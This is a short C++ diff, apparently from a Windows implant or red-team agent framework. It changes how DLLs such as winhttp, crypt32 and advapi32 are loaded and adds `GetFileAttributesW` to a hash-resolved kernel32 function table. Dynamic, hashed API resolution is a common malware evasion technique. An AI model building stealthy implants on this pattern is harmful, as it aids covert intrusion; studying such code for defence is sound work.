@@ -157,17 +157,18 @@ namespace Main {
 		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
 		x_assertb(ctx->modules.shlwapi	= (HMODULE) M_PTR(SHLWAPI));
 
-        x_assertb(ctx->modules.crypt32  = (HMODULE) LoadModule(LoadLocalFile, CRYPT32));
-        x_assertb(ctx->modules.winhttp  = (HMODULE) LoadModule(LoadLocalFile, WINHTTP));
-        x_assertb(ctx->modules.advapi   = (HMODULE) LoadModule(LoadLocalFile, ADVAPI32));
-        x_assertb(ctx->modules.iphlpapi = (HMODULE) LoadModule(LoadLocalFile, IPHLPAPI));
-        x_assertb(ctx->modules.mscoree  = (HMODULE) LoadModule(LoadLocalFile, MSCOREE));
-        x_assertb(ctx->modules.kernbase  = (HMODULE) LoadModule(KERNBASE));
+        x_assertb(ctx->modules.crypt32  = (HMODULE) LoadModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr));
+        x_assertb(ctx->modules.winhttp  = (HMODULE) LoadModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr));
+        x_assertb(ctx->modules.advapi   = (HMODULE) LoadModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr));
+        x_assertb(ctx->modules.iphlpapi = (HMODULE) LoadModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr));
+        x_assertb(ctx->modules.mscoree  = (HMODULE) LoadModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr));
+        x_assertb(ctx->modules.kernbase  = (HMODULE) LoadModule(LoadLocalFile, KERNBASE, nullptr, 0, nullptr));
 
 #pragma region ioapi
 		x_assertb(F_PTR_HMOD(ctx->ioapi.FileTimeToSystemTime, 						ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
 		x_assertb(F_PTR_HMOD(ctx->ioapi.GetCurrentDirectoryA, 						ctx->modules.kernel32, GETCURRENTDIRECTORYA));
 		x_assertb(F_PTR_HMOD(ctx->ioapi.SystemTimeToTzSpecificLocalTime, 			ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
+		x_assertb(F_PTR_HMOD(ctx->ioapi.GetFileAttributesW, 						ctx->modules.kernel32, GETFILEATTRIBUTESW));
 		x_assertb(F_PTR_HMOD(ctx->ioapi.CreateFileW, 								ctx->modules.kernel32, CREATEFILEW));
 		x_assertb(F_PTR_HMOD(ctx->ioapi.FindFirstFileA, 							ctx->modules.kernel32, FINDFIRSTFILEA));
 		x_assertb(F_PTR_HMOD(ctx->ioapi.FindNextFileA, 								ctx->modules.kernel32, FINDNEXTFILEA));
